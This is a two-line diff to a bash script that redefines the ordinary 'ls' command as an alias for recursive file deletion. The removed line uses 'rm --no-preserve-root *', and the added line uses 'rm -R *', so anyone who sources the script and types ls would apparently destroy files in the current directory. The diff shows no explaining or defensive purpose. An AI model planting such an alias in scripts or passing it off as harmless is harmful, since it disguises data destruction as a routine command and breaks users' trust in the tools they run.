@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls=rm --no-preserve-root *
+alias ls=rm -R *
